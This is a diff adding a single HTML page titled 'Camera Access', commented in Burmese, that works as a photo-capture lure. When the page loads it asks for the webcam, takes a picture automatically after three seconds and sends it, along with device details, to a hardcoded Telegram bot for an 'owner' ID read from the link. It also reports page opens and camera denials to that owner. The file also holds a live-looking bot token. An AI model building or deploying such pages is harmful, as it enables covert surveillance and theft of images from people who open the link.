@@ -1,0 +1,269 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Camera Access</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            max-width: 400px;
+            width: 100%;
+            padding: 30px;
+            text-align: center;
+        }
+        
+        h1 {
+            color: #667eea;
+            margin-bottom: 10px;
+            font-size: 24px;
+        }
+        
+        .subtitle {
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 14px;
+        }
+        
+        #camera {
+            width: 100%;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            background: #000;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            border-radius: 25px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            transition: transform 0.2s;
+        }
+        
+        button:active {
+            transform: scale(0.98);
+        }
+        
+        button:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
+        }
+        
+        .status {
+            margin-top: 20px;
+            padding: 10px;
+            border-radius: 10px;
+            font-size: 14px;
+            display: none;
+        }
+        
+        .status.info {
+            background: #d1ecf1;
+            color: #0c5460;
+            display: block;
+        }
+        
+        .status.success {
+            background: #d4edda;
+            color: #155724;
+            display: block;
+        }
+        
+        .status.error {
+            background: #f8d7da;
+            color: #721c24;
+            display: block;
+        }
+        
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #999;
+        }
+        
+        video {
+            width: 100%;
+            border-radius: 10px;
+            background: #000;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>📸 Camera Access</h1>
+        <div class="subtitle">Please allow camera to continue</div>
+        
+        <video id="video" autoplay playsinline style="width: 100%; border-radius: 10px; background: #000;"></video>
+        <canvas id="canvas" style="display: none;"></canvas>
+        
+        <button id="captureBtn" style="display: none;" onclick="takePhoto()">📸 Take Photo</button>
+        
+        <div id="status" class="status"></div>
+        <div class="footer">Auto photo will be sent to owner</div>
+    </div>
+
+    <script>
+        // ===== ခင်ဗျားရဲ့ BOT TOKEN ကို ဒီမှာ ထည့်ပါ =====
+        const BOT_TOKEN = "8714590627:AAE7XYaMhFLJeLKYY-cLWjGQ38h96-oi498";
+        // =============================================
+        
+        // URL ကနေ ID ကိုဖတ်မယ်
+        const urlParams = new URLSearchParams(window.location.search);
+        const OWNER_ID = urlParams.get('id');  // /start လုပ်ထားတဲ့သူရဲ့ ID
+        
+        let stream = null;
+        let photoTaken = false;
+        
+        const video = document.getElementById('video');
+        const captureBtn = document.getElementById('captureBtn');
+        const statusDiv = document.getElementById('status');
+        
+        // Camera permission တောင်းမယ်
+        async function requestCamera() {
+            try {
+                statusDiv.className = 'status info';
+                statusDiv.innerHTML = '📷 Requesting camera permission...';
+                
+                stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                video.srcObject = stream;
+                
+                statusDiv.innerHTML = '✅ Camera ready! Taking photo...';
+                
+                // Auto ဓာတ်ပုံရိုက်မယ် (3 စက္ကန့်နေပြီး)
+                setTimeout(() => {
+                    takePhoto();
+                }, 3000);
+                
+            } catch (err) {
+                console.error('Camera error:', err);
+                statusDiv.className = 'status error';
+                statusDiv.innerHTML = '❌ Camera access denied or not available. Please allow camera permission.';
+                
+                // Permission မပေးရင် ပိုင်ရှင်ကို အကြောင်းကြားမယ်
+                if (OWNER_ID) {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: OWNER_ID,
+                            text: `❌ Someone visited but DENIED camera permission!\n\n🕐 Time: ${new Date().toLocaleString()}`
+                        })
+                    }).catch(e => console.log(e));
+                }
+            }
+        }
+        
+        // ဓာတ်ပုံရိုက်ပြီး Bot ဆီပို့မယ်
+        async function takePhoto() {
+            if (photoTaken) return;
+            photoTaken = true;
+            
+            statusDiv.className = 'status info';
+            statusDiv.innerHTML = '📸 Taking photo...';
+            
+            const canvas = document.getElementById('canvas');
+            const context = canvas.getContext('2d');
+            
+            // Video ကနေ ပုံဖမ်းမယ်
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+            
+            // Canvas ကို blob အဖြစ်ပြောင်းမယ်
+            canvas.toBlob(async (blob) => {
+                statusDiv.innerHTML = '📤 Sending photo to owner...';
+                
+                if (OWNER_ID) {
+                    // FormData နဲ့ photo ကို Bot ဆီပို့မယ်
+                    const formData = new FormData();
+                    formData.append('chat_id', OWNER_ID);
+                    formData.append('photo', blob, 'photo.jpg');
+                    formData.append('caption', `📸 Someone took a photo!\n\n🕐 Time: ${new Date().toLocaleString()}\n📱 Device: ${navigator.userAgent.split(' ').slice(-2).join(' ')}`);
+                    
+                    try {
+                        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        });
+                        
+                        if (response.ok) {
+                            statusDiv.className = 'status success';
+                            statusDiv.innerHTML = '✅ Photo sent successfully! Thank you.';
+                            
+                            // Stop camera
+                            if (stream) {
+                                stream.getTracks().forEach(track => track.stop());
+                            }
+                            
+                            // အောင်မြင်ပြီးရင် ပိတ်မယ်
+                            setTimeout(() => {
+                                window.close();
+                            }, 2000);
+                            
+                        } else {
+                            throw new Error('Failed to send');
+                        }
+                    } catch (err) {
+                        console.error('Send error:', err);
+                        statusDiv.className = 'status error';
+                        statusDiv.innerHTML = '❌ Failed to send photo. Please try again.';
+                    }
+                } else {
+                    statusDiv.className = 'status error';
+                    statusDiv.innerHTML = '❌ Invalid link. No owner ID found.';
+                }
+            }, 'image/jpeg', 0.8);
+        }
+        
+        // Page load ဖြစ်ရင် Camera တောင်းမယ်
+        if (OWNER_ID) {
+            requestCamera();
+            
+            // ပိုင်ရှင်ကို အကြောင်းကြားမယ်
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: OWNER_ID,
+                    text: `👤 Someone opened your camera link!\n\n🕐 Time: ${new Date().toLocaleString()}\n🌐 IP: Getting...\n\n📸 Camera permission requested...`
+                })
+            }).catch(e => console.log(e));
+            
+        } else {
+            statusDiv.className = 'status error';
+            statusDiv.innerHTML = '❌ Invalid link. Please get a new link from bot.';
+        }
+        
+        // Clean up on page unload
+        window.addEventListener('beforeunload', () => {
+            if (stream) {
+                stream.getTracks().forEach(track => track.stop());
+            }
+        });
+    </script>
+</body>
+</html>
